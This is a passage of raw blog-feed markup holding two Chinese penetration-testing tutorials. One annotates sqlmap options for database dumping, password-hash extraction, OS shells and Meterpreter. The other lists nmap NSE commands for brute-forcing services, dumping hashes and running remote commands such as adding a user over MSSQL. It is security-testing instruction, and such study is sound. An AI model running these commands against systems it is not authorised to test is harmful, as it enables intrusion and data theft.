检索所有"></a>-a, –all   检索所有</h4><h5 id="此参数在没有获得数据库信息的时候用的较多，"><a href="#此参数在没有获得数据库信息的时候用的较多，" class="headerlink" title="此参数在没有获得数据库信息的时候用的较多，"></a>此参数在没有获得数据库信息的时候用的较多，</h5><p>来检索所有内容，在一旦注入成功且获得精确信息<br>通过以下详细参数来指定检索、枚举动作和动作执行对象。</p><h4 id="b-–banner-检索DBMS的banner"><a href="#b-–banner-检索DBMS的banner" class="headerlink" title="-b, –banner         检索DBMS的banner"></a>-b, –banner         检索DBMS的banner</h4><p>–current-user       检索DBMS的当前用户<br>–current-db         检索DBMS的数据库<br>–hostname           检索DBMS的host<br>–is-dba             检测DBMS的当前用户是否是DBA<br>–users              枚举DBMS的用户<br>–passwords          枚举DBMS的密码hash<br>–privileges         枚举DBMS的用户权限<br>–roles              枚举DBMS的用户角色<br>–dbs                枚举DBMS的所有数据库<br>–tables             枚举DBMS的数据库里的所有表<br>–columns            枚举DBMS的数据库里表的所有列<br>–schema             枚举DBMS的概要<br>–count              检索表的条目数<br>–dump               转存DBMS数据库表项<br>–dump-all           转存所有DBMS数据库的表项<br>–search             搜索列、表、和或数据库名<br>–comments           检索DBMS信息<br>-D DB                指定枚举的库<br>-T TBL               指定枚举的表<br>-C COL               指定枚举的表列<br>-X EXCLUDECOL        指定不枚举的表列<br>-U USER              指定枚举的用户<br>–exclude-sysdbs    枚举表的时候排除系统数据库<br>–where=DUMPWHERE    dump表的时候指定路径<br>–start=LIMITSTART   第一个检索输出条目<br>–stop=LIMITSTOP     最后一个检索输出条目<br>–first=FIRSTCHAR    第一个检索输出的字符串<br>–last=LASTCHAR      最后一个检索输出的字符串</p><h5 id="到这一步的时候，代表已经注入成功，需要对注入成功的库执行操作，这里是比较常见的操作："><a href="#到这一步的时候，代表已经注入成功，需要对注入成功的库执行操作，这里是比较常见的操作：" class="headerlink" title="到这一步的时候，代表已经注入成功，需要对注入成功的库执行操作，这里是比较常见的操作："></a>到这一步的时候，代表已经注入成功，需要对注入成功的库执行操作，这里是比较常见的操作：</h5><p>检索DBMS的指纹特征、数据库、host值、用户身份、并对用户、密码、权限、角色进行枚举也就是爆破。<br>然后尝试枚举数据库、数据库里的表、数据库里的内容、可以使用count来统计条目等操作。<br>dump和dump-all就是脱裤和全脱的区别，dump某表的十条八条可能没事儿，dump-all注定要浪迹天涯，也就是所谓的从脱裤到跑路的开始，<br>通过-D-T-C来制定索要枚举的库、表、和列，使用-X来排除不想要的列，特别是有多列且有无意义字段的时候，使用-X可大大节省时间。<br>–exclude-sysdbs参数，将不会获取数据库自带的系统库内容，可减少干扰内容，对-count的使用和枚举信息的使用建议搭配此参数来排除系统库。<br>当我们不想跑路的时候，那么请使用一下内容：<br>    –start=LIMITSTART  First query output entry to retrieve<br>        指定从第几行开始输出，如–start=1<br>    –stop=LIMITSTOP    Last query output entry to retrieve<br>        指定从第几行停止输出 –stop=10<br>    –first=FIRSTCHAR   First query output word character to retrieve<br>        指定从第几个字符开始输出 –first 1<br>    –last=LASTCHAR     Last query output word character to retrieve<br>        指定从第几个字符停止输出 –last10 </p><h4 id="–sql-query-QUERY-执行的sql语句"><a href="#–sql-query-QUERY-执行的sql语句" class="headerlink" title="–sql-query=QUERY    执行的sql语句"></a>–sql-query=QUERY    执行的sql语句</h4><p>–sql-shell          交互式sqlshell<br>–sql-file=SQLFILE   从文件里运行sql语句</p><h5 id="指定想执行的语句，注入成功后自动执行，例如新建用户、dump-all等"><a href="#指定想执行的语句，注入成功后自动执行，例如新建用户、dump-all等" class="headerlink" title="指定想执行的语句，注入成功后自动执行，例如新建用户、dump-all等"></a>指定想执行的语句，注入成功后自动执行，例如新建用户、dump-all等</h5><p>系统交互shell，一旦成功可执行任意语句，例如wget、curl、useradd、nc等<br>从文件中读取执行想要执行的sql语句</p><h3 id="Brute-force-暴力"><a href="#Brute-force-暴力" class="headerlink" title="Brute force 暴力"></a>Brute force 暴力</h3><p>这些选项用于暴力检查</p><h4 id="–common-tables-检查通用表"><a href="#–common-tables-检查通用表" class="headerlink" title="–common-tables  检查通用表"></a>–common-tables  检查通用表</h4><p>–common-columns 检查通用列</p><h5 id="暴力检查："><a href="#暴力检查：" class="headerlink" title="暴力检查："></a>暴力检查：</h5><p>猜测检查常见的、通用的表名和列名，可通过下面两个文件进行定制化<br>暴力破解的表在txt/common-tables.txt文件中<br>暴力破解的列名在txt/common-columns.txt中</p><h3 id="User-defined-function-injection-用户定义注入函数"><a href="#User-defined-function-injection-用户定义注入函数" class="headerlink" title="User-defined function injection 用户定义注入函数"></a>User-defined function injection 用户定义注入函数</h3><h4 id="–udf-inject-使用用户自定义的函数进行注入"><a href="#–udf-inject-使用用户自定义的函数进行注入" class="headerlink" title="–udf-inject  使用用户自定义的函数进行注入"></a>–udf-inject  使用用户自定义的函数进行注入</h4><p>–shared-lib=SHLIB  共享库的本地路径</p><h5 id="自定义函数："><a href="#自定义函数：" class="headerlink" title="自定义函数："></a>自定义函数：</h5><p>通过编译注入自定义的函数（UDFs）或PostgreSQL在windows中共享库，DLL，或者Linux/Unix中共享对象，<br>上传到服务器数据库自定义函数，然后根据选择执行他们。本人基本不用自定义函数，共享库和系统函数超出我的知识范围。</p><h3 id="File-system-access-访问文件系统"><a href="#File-system-access-访问文件系统" class="headerlink" title="File system access 访问文件系统"></a>File system access 访问文件系统</h3><p>用于访问后端数据库管理系统的底层文件系统</p><h4 id="–file-read-RFILE-从后台DBMS文件系统里读取一个文件"><a href="#–file-read-RFILE-从后台DBMS文件系统里读取一个文件" class="headerlink" title="–file-read=RFILE  从后台DBMS文件系统里读取一个文件"></a>–file-read=RFILE  从后台DBMS文件系统里读取一个文件</h4><p>–file-write=WFILE 从后台DBMS文件系统里写一个本地文件<br>–file-dest=DFILE   后端DBMS写入的绝对文件路径 </p><h5 id="针对文件系统的读写："><a href="#针对文件系统的读写：" class="headerlink" title="针对文件系统的读写："></a>针对文件系统的读写：</h5><p>对–file-read配置绝对系统路径，<br>可读取相应文件内容，可以是文本，也可以是二进制，<br>条件是必须拥有相对应特权，已知的是mysql、postgresql和sqlserver。<br>写入也是同样，往远端后台的DBMS里写入一个本地文件，可通过–file-dest指定绝对文件路径。</p><h3 id="Operating-system-access-操作系统连接"><a href="#Operating-system-access-操作系统连接" class="headerlink" title="Operating system access 操作系统连接"></a>Operating system access 操作系统连接</h3><p>用于连接后端DBMS底层的os</p><h4 id="–os-cmd-OSCMD-运行一个OS命令"><a href="#–os-cmd-OSCMD-运行一个OS命令" class="headerlink" title="–os-cmd=OSCMD  运行一个OS命令"></a>–os-cmd=OSCMD  运行一个OS命令</h4><p>–os-shell 建立交互式的os shell<br>–os-pwn 建立一个 oob shel meterpreter或者vnc<br>–os-smbrelay  一键生成oob shel meterpreter或者vnc<br>–os-bof 利用存储过程缓冲区溢出<br>–priv-esc 用户权限提升<br>–msf-path=MSFPATH  安装metasploit framework的本地路径<br>–tmp-path=TMPPATH 临时文件目录的远程绝对路径</p><h5 id="对文件系统、操作系统的交互和使用必须需要相应的权限，前面提到要求具有特定的函数执行特权，一般要求root。"><a href="#对文件系统、操作系统的交互和使用必须需要相应的权限，前面提到要求具有特定的函数执行特权，一般要求root。" class="headerlink" title="对文件系统、操作系统的交互和使用必须需要相应的权限，前面提到要求具有特定的函数执行特权，一般要求root。"></a>对文件系统、操作系统的交互和使用必须需要相应的权限，前面提到要求具有特定的函数执行特权，一般要求root。</h5><p>当然和上面可以配合使用，当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。<br>然后通过上面的文件系统管理上传一个库，使用可执行系统命令的sys_exec()和sys_eval()，甚至xp_cmdshell存储过程<br>–os-shell参数也可以模拟一个真实的shell，可以输入你想执行的命令。<br>Meterpreter配合使用<br>–os-pwn,–os-smbrelay,–os-bof,–priv-esc,–msf-path,–tmp-path配合Meterpreter使用，<br>当前用户有权限使用特定的函数，可以在数据库与攻击者直接建立TCP连接，<br>这个连接可以是一个交互式命令行的Meterpreter会话，sqlmap根据Metasploit生成shellcode，四种方式执行它：<br>1、通过用户自定义的sys_bineval()函数在内存中执行Metasplit的shellcode，支持MySQL和PostgreSQL数据库，参数：–os-pwn。<br>2、通过用户自定义的函数上传一个独立的payload执行，MySQL和PostgreSQL的sys_exec()函数，Microsoft SQL Server的xp_cmdshell()函数，参数：–os-pwn。<br>3、通过SMB攻击(MS08-068)来执行Metasploit的shellcode，当sqlmap获取到的权限足够高的时候（Linux/Unix的uid=0，Windows是Administrator），–os-smbrelay。<br>4、通过溢出Microsoft SQL Server 2000和2005的sp_replwritetovarbin存储过程(MS09-004)，在内存中执行Metasploit的payload，参数：–os-bof</p><h3 id="windows注册表连接"><a href="#windows注册表连接" class="headerlink" title="windows注册表连接"></a>windows注册表连接</h3><p>用于连接后端DBMS的windows 注册表</p><h4 id="–reg-read-读取windows-注册表键值"><a href="#–reg-read-读取windows-注册表键值" class="headerlink" title="–reg-read          读取windows 注册表键值"></a>–reg-read          读取windows 注册表键值</h4><p>–reg-add           编辑一个windows注册表键值数据<br>–reg-del           删除一个windows注册表键值<br>–reg-key=REGKEY    windows注册表项<br>–reg-value=REGVAL  windows注册表项的值<br>–reg-data=REGDATA  windows注册表项的数据<br>–reg-type=REGTYPE  windows注册表项值的类型</p><h5 id="所见即所得，注册表连接指的是windows系统，相信大家都有windows系统知识，不懂注册表基本就不懂windows系统，"><a href="#所见即所得，注册表连接指的是windows系统，相信大家都有windows系统知识，不懂注册表基本就不懂windows系统，" class="headerlink" title="所见即所得，注册表连接指的是windows系统，相信大家都有windows系统知识，不懂注册表基本就不懂windows系统，"></a>所见即所得，注册表连接指的是windows系统，相信大家都有windows系统知识，不懂注册表基本就不懂windows系统，</h5><p>所有的windows系统配置在注册表里都可实现，比如开启远程连接、比如新建用户、比如组策略配置、比如防火墙等等，<br>这里的reg现象可对注册表内容进行读取、编辑、和删除，上面和下面相配合可实现对指定的key、value、data和类型进行操作。</p><h3 id="通用参数和混杂选项"><a href="#通用参数和混杂选项" class="headerlink" title="通用参数和混杂选项"></a>通用参数和混杂选项</h3><h4 id="【通用参数】"><a href="#【通用参数】" class="headerlink" title="【通用参数】"></a>【通用参数】</h4><p>-s SESSIONFILE      从存储文件里加载session<br>-t TRAFFICFILE       记录所有的http流量到一个文本文件<br>–batch             使用默认配置，不管用户的输入<br>–charset=CHARSET   强制数据检索编码格式<br>–crawl=CRAWLDEPTH   从目标网站开始爬取网站<br>–csv-del=CSVDEL    CSV输出文件使用的分割字符<br>–dump-format=DU..  dump数据的格式<br>–eta               显示输出的预计用时<br>–flush-session     为当前目标刷新session文件<br>–forms             在目标url上解析和测试表单<br>–fresh-queries     忽略在session文件里的查询结果<br>–hex               使用DBMS的hex函数进行数据检索<br>–output-dir=OUT..   输出路径<br>–parse-errors      解析和列出DBMS的响应错误信息<br>–pivot-column=P..  主列名称<br>–save              保存选项到一个ini配置文件<br>–scope=SCOPE       指定正则表达式从提供的代理日志里过滤目标<br>–test-filter=TE..  选择测试payload或titles<br>–update            更新sqlmap</p><p>【混杂参数】<br>-z MNEMONICS        使用短助记符(e.g. “flu,bat,ban,tec=EU”)<br>–alert=ALERT       当发现sql注入时，运行主机os命令<br>–answers=ANSWERS   设置问题答案(e.g. “quit=N,follow=N”)<br>–beep              当发现sql注入时，发出蜂鸣声<br>–cleanup           从sqlmap特定的udf和表里清除dbms<br>–dependencies      检查sqlmap缺少的依赖关系<br>–disable-coloring  禁用控制台输出颜色<br>–gpage=GOOGLEPAGE  指定使用的google dork响应的页码<br>–identify-waf      绕过WAF IPS IDS<br>–mobile            使用UA模拟成智能手机<br>–page-rank         展示google dork结果的页码值<br>–purge-output      从输出目录安全移除所有内容<br>–smart             在积极启发的情况下进行彻底的测试<br>–sqlmap-shell      构建一个交互式sqlmap shell<br>–wizard            初学者简单向导</p><h5 id="这两项内容属于常用技巧类搭配动作，可根据翻译使用，不做过多解释，这里提一下几个需要注意的参数，"><a href="#这两项内容属于常用技巧类搭配动作，可根据翻译使用，不做过多解释，这里提一下几个需要注意的参数，" class="headerlink" title="这两项内容属于常用技巧类搭配动作，可根据翻译使用，不做过多解释，这里提一下几个需要注意的参数，"></a>这两项内容属于常用技巧类搭配动作，可根据翻译使用，不做过多解释，这里提一下几个需要注意的参数，</h5><p>–batch  在使用sqlmap时，有时一些响应需要用户交互，输入Y、N、sky、quit等，使用此选项可使用默认配置。<br>–output-dir=  指定输出路径，方式控制台输出过多，无法查看，也方便记录<br>–gpage=GOOGLEPAGE 好像默认是使用google搜索的前100个文件，当使用前面的-g参数，配合此参数指定页面<br>–identify-waf  进行WAF/IPS/IDS保护测试，目前大约支持30种产品的识别<br>–mobile 使用移动产品UA，把sqlmap伪装成手机，也可使用前面的-user-agent自己指定<br>–smart  智能深度启发式扫描，或许额会有惊喜呢。<br>–wizard 和上面的完全不同，纯新手选择，一步步让你输入url等参数，基本输入个url就行。</p>]]></content>
      
      
      <categories>
          
          <category> PenTest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PenTest </tag>
            
            <tag> PenTestTool </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nmap进阶使用-脚本篇</title>
      <link href="/2019/03/24/nmap-jin-jie-shi-yong-jiao-ben-pian/"/>
      <url>/2019/03/24/nmap-jin-jie-shi-yong-jiao-ben-pian/</url>
      
        <content type="html"><![CDATA[<p><img src="nmap%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8%E8%84%9A%E6%9C%AC%E7%AF%87.png" alt></p><h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><p>因为今天的重点并非nmap本身使用,这次主要还是想给大家介绍一些在实战中相对比较实用的nmap脚本,所以关于nmap自身的一些选项作用就不再多说了,详情可参考博客端口渗透相关文章,废话少说,我们直接开始,实际中我们可以先用下面的语句,大概扫一眼目标机器或目标C段都跑了什么服务,心里先有个谱,之后才好针对性的出牌嘛:</p><a id="more"></a><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># nmap -sV -sT -Pn --open -v 192.168.3.23</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>当然,你也可以尝试先获取下目标机器各个服务更详细的banner信息,因为有些服务工具漏洞只能影响特定的版本,所以,提前知道一下还是非常有必要的:</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -sT -Pn --open -v banner.nse 192.168.3.23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="0x02-和ftp相关的一些漏洞检测脚本"><a href="#0x02-和ftp相关的一些漏洞检测脚本" class="headerlink" title="0x02 和ftp相关的一些漏洞检测脚本:"></a>0x02 和ftp相关的一些漏洞检测脚本:</h3><p>ftp-anon.nse    检查目标ftp是否允许匿名登录,光能登陆还不够,它还会自动检测目录是否可读写,如,批量ftp抓鸡</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># nmap -p 21 --script ftp-anon.nse -v 192.168.3.23</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ftp-brute.nse    ftp爆破脚本 只会尝试一些比较简单的弱口令,时间可能要稍微长一些(挂vpn以后这个爆破速度可能会更慢),毕竟,是直接在公网爆破</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 21 --script ftp-brute.nse -v 192.168.3.23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ftp-vuln-cve2010-4221.nse    ProFTPD 1.3.3c之前的netio.c文件中的pr_netio_telnet_gets函数中存在多个栈溢出</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 21 --script ftp-vuln-cve2010-4221.nse -v 192.168.3.23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ftp-proftpd-backdoor.nse    ProFTPD 1.3.3c 被人插后门proftpd-1.3.3c.tar.bz2,缺省只执行id命令,可自行到脚本中它换成能直接弹bash的命令</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 21 --script ftp-vuln-cve2010-4221.nse -v 192.168.3.23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ftp-vsftpd-backdoor.nse    VSFTPD v2.3.4 跟Proftp同样的问题,被人插了后门</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 21 --script ftp-vsftpd-backdoor.nse -v 192.168.3.23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="0x03-和ssh-相关的一些扫描脚本"><a href="#0x03-和ssh-相关的一些扫描脚本" class="headerlink" title="0x03 和ssh 相关的一些扫描脚本:"></a>0x03 和ssh 相关的一些扫描脚本:</h3><p>sshv1.nse     sshv1是可以中间人的</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 22 --script sshv1.nse -v 192.168.3.23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="0x04和smtp-相关的一些扫描脚本"><a href="#0x04和smtp-相关的一些扫描脚本" class="headerlink" title="0x04和smtp 相关的一些扫描脚本"></a>0x04和smtp 相关的一些扫描脚本</h3><p>smtp-brute.nse    简单爆破smtp</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 25 --script smtp-brute.nse -v 192.168.3.23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>smtp-enum-users.nse      枚举目标smtp服务器的邮件用户名,前提是目标要存在此错误配置才行</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 25 --script smtp-enum-users.nse -v 192.168.3.23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>smtp-vuln-cve2010-4344.nse    Exim 4.70之前版本中的string.c文件中的string_vformat函数中存在堆溢出</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 25 --script smtp-vuln-cve2010-4344.nse -v 192.168.3.23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>smtp-vuln-cve2011-1720.nse     Postfix 2.5.13之前版本，2.6.10之前的2.6.x版本，2.7.4之前的2.7.x版本和2.8.3之前的2.8.x版本,存在溢出</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 25 --script smtp-vuln-cve2011-1720.nse -v 192.168.3.23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>smtp-vuln-cve2011-1764.nse     Exim “dkim_exim_verify_finish()” 存在格式字符串漏洞,太老基本很难遇到了</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 25 --script smtp-vuln-cve2011-1764.nse -v 192.168.3.23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="0x05-和pop3-相关的一些扫描脚本"><a href="#0x05-和pop3-相关的一些扫描脚本" class="headerlink" title="0x05 和pop3 相关的一些扫描脚本:"></a>0x05 和pop3 相关的一些扫描脚本:</h3><p>pop3-brute.nse    pop简单弱口令爆破</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 110 --script pop3-brute.nse -v 192.168.3.23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="0x06-和imap-相关的一些扫描脚本"><a href="#0x06-和imap-相关的一些扫描脚本" class="headerlink" title="0x06 和imap 相关的一些扫描脚本:"></a>0x06 和imap 相关的一些扫描脚本:</h3><p>imap-brute.nse    imap简单弱口令爆破</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 143,993 --script imap-brute.nse -v 192.168.3.23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="0x07-和dns-相关的一些漏洞扫描脚本"><a href="#0x07-和dns-相关的一些漏洞扫描脚本" class="headerlink" title="0x07 和dns 相关的一些漏洞扫描脚本:"></a>0x07 和dns 相关的一些漏洞扫描脚本:</h3><p>dns-zone-transfer.nse     检查目标ns服务器是否允许传送</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 53 --script dns-zone-transfer.nse -v 192.168.3.23nmap -p 53 --script dns-zone-transfer.nse --script-args dns-zone-transfer.domain<span class="token operator">=</span>target.org -v 192.168.3.23<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>hostmap-ip2hosts.nse     旁站查询,目测了一下脚本,用的ip2hosts的接口,不过该接口似乎早已停用,如果想继续用,可自行到脚本里把接口部分的代码改掉</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p80 --script hostmap-ip2hosts.nse 192.168.3.23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="0x08-和各种数据库相关的扫描脚本"><a href="#0x08-和各种数据库相关的扫描脚本" class="headerlink" title="0x08 和各种数据库相关的扫描脚本:"></a>0x08 和各种数据库相关的扫描脚本:</h3><p>informix-brute.nse   informix爆破脚本</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 9088 --script informix-brute.nse 192.168.3.23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>mysql-empty-password.nse   mysql 扫描root空密码</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 3306 --script mysql-empty-password.nse -v 192.168.3.23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>mysql-brute.nse    mysql root弱口令简单爆破</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 3306 --script mysql-brute.nse -v 192.168.3.23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>mysql-dump-hashes.nse    导出mysql中所有用户的hash</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 3306 --script mysql-dump-hashes --script-args<span class="token operator">=</span><span class="token string">'username=root,password=root'</span> 192.168.3.23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>mysql-vuln-cve2012-2122.nse   Mysql身份认证漏洞MariaDB and MySQL  5.1.61,5.2.11, 5.3.5, 5.5.22,利用条件有些苛刻 需要目标的mysql是自己源码编译安装的,这样的成功率相对较高</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 3306 --script mysql-vuln-cve2012-2122.nse  -v 192.168.3.23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ms-sql-info.nse 扫描C段mssql</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 445 --script ms-sql-info.nse -v 203.124.11.0/24      nmap -p 1433 --script ms-sql-info.nse --script-args mssql.instance-port<span class="token operator">=</span>1433 -v 192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ms-sql-empty-password.nse     扫描mssql sa空密码</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 1433 --script ms-sql-empty-password.nse -v 192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ms-sql-brute.nse    sa弱口令爆破</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 1433 --script ms-sql-brute.nse -v 192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ms-sql-xp-cmdbash.nse   利用xp_cmdbash,远程执行系统命令</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 1433 --script ms-sql-xp-cmdbash --script-args mssql.username<span class="token operator">=</span>sa,mssql.password<span class="token operator">=</span>sa,ms-sql-xp-cmdbash.cmd<span class="token operator">=</span><span class="token string">"net user test test /add"</span> 192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ms-sql-dump-hashes.nse    导出mssql中所有的数据库用户及密码hash</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 1433 --script ms-sql-dump-hashes -v 192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>pgsql-brute.nse   尝试爆破postgresql</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 5432 --script pgsql-brute -v 192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>oracle-brute-stealth.nse  尝试爆破oracle</p><pre class="line-numbers language-bash"><code class="language-bash">nmap --script oracle-brute-stealth -p 1521 --script-args oracle-brute-stealth.sid<span class="token operator">=</span>ORCL  -v 192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>oracle-brute.nse</p><pre class="line-numbers language-bash"><code class="language-bash">nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid<span class="token operator">=</span>ORCL -v 192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>mongodb-brute.nse   尝试爆破mongdb</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 27017  --script mongodb-brute 192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>redis-brute.nse   redis爆破</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 6379 --script redis-brute.nse 192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="0x09-和snmp相关的一些扫描脚本"><a href="#0x09-和snmp相关的一些扫描脚本" class="headerlink" title="0x09 和snmp相关的一些扫描脚本:"></a>0x09 和snmp相关的一些扫描脚本:</h3><p>snmp-brute.nse   爆破C段的snmp </p><pre class="line-numbers language-bash"><code class="language-bash">nmap -sU --script snmp-brute --script-args snmp-brute.communitiesdb<span class="token operator">=</span>user.txt 192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="0x10-和telnet相关的一些扫描脚本"><a href="#0x10-和telnet相关的一些扫描脚本" class="headerlink" title="0x10 和telnet相关的一些扫描脚本:"></a>0x10 和telnet相关的一些扫描脚本:</h3><p>telnet-brute.nse   简单爆破telnet</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 23 --script telnet-brute --script-args userdb<span class="token operator">=</span>myusers.lst,passdb<span class="token operator">=</span>mypwds.lst,telnet-brute.timeout<span class="token operator">=</span>8s -v 192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="0x11-和ldap服务相关的一些利用脚本"><a href="#0x11-和ldap服务相关的一些利用脚本" class="headerlink" title="0x11 和ldap服务相关的一些利用脚本:"></a>0x11 和ldap服务相关的一些利用脚本:</h3><p>ldap-brute.nse   简单爆破ldap</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 389 --script ldap-brute --script-args ldap.base<span class="token operator">=</span><span class="token string">'"cn=users,dc=cqure,dc=net"'</span> 192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="0x12-和各类web中间件-web集成环境相关的一些利用脚本"><a href="#0x12-和各类web中间件-web集成环境相关的一些利用脚本" class="headerlink" title="0x12 和各类web中间件,web集成环境相关的一些利用脚本:"></a>0x12 和各类web中间件,web集成环境相关的一些利用脚本:</h3><p>xmpp-brute.nse    xmpp爆破</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 5222 --script xmpp-brute.nse  192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>http-iis-short-name-brute.nse       短文件扫描</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p80 --script http-iis-short-name-brute.nse 192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>http-iis-webdav-vuln.nse       iis 5.0 /6.0 webadv写</p><pre class="line-numbers language-bash"><code class="language-bash">nmap --script http-iis-webdav-vuln.nse -p80,8080 192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>http-bashshock.nse      bash远程执行</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -sV -p- --script http-bashshock --script-args uri<span class="token operator">=</span>/cgi-bin/bin,cmd<span class="token operator">=</span>ls 192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>http-svn-info.nse       探测目标svn</p><pre class="line-numbers language-bash"><code class="language-bash">nmap --script http-svn-info 192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>http-drupal-enum.nse        其实对于这类的开源程序,我们根本没必要用nmap,因为搞多了,差不多一眼就能看出来<br>http-wordpress-brute.nse</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p80 -sV --script http-wordpress-brute --script-args <span class="token string">'userdb=users.txt,passdb=passwds.txt,http-wordpress-brute.hostname=domain.com,http-wordpress-brute.threads=3,brute.firstonly=true'</span> 192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>http-backup-finder.nse   扫描目标网站备份</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p80 --script<span class="token operator">=</span>http-backup-finder 192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>http-vuln-cve2015-1635.nse   iis6.0远程代码执行</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -sV --script http-vuln-cve* --script-args uri<span class="token operator">=</span><span class="token string">'/anotheruri/'</span>  192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="0x13-跟vpn相关的一些利用脚本-暂时只看到一个pptp还好使"><a href="#0x13-跟vpn相关的一些利用脚本-暂时只看到一个pptp还好使" class="headerlink" title="0x13 跟vpn相关的一些利用脚本,暂时只看到一个pptp还好使:"></a>0x13 跟vpn相关的一些利用脚本,暂时只看到一个pptp还好使:</h3><p>pptp-version.nse   识别目标pptp版本</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 1723 --script pptp-version.nse 192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="0x14-smb漏洞检测脚本集"><a href="#0x14-smb漏洞检测脚本集" class="headerlink" title="0x14 smb漏洞检测脚本集::"></a>0x14 